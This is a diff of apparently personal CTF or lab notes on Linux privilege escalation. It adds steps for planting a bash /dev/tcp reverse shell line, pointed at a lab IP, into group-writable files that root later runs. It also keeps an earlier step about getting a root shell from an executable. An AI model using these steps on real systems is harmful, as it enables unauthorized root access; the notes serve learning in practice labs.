@@ -23,11 +23,12 @@
 6. Allow it to be executed with ```chmod 777 thm```
 7. Go back and run the executable and you will be given a shell with root.
 
-
-
-
-// 1. use ```id``` command to check which groups the user is a part of. 
-// 2. once we find the groups the a user is a part of, we can use
+## Reverse Shells
+1. use ```id``` command to check which groups the user is a part of.
+2. Once we find the groups the a user is a part of, we can use
     ```find / -group "groupName" -type f 2>/dev/null```
-// to find the files that are owned by the group/user
+to find the files that are owned by the group/user
+3. in that file, add a script from ```https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet``` that gives a reverse shell. In case bash is used for the reverse shell, use ```bash -c 'bash -i >&  /dev/tcp/10.6.31.128/1337 0>&1'```
+4. Save the file with the new script.
+5. If the file that you just manipulated is only run by a user with root privileges, find out when and how to run that file. Sometimes there are certain files that are ran on startup or ssh login as root.
 
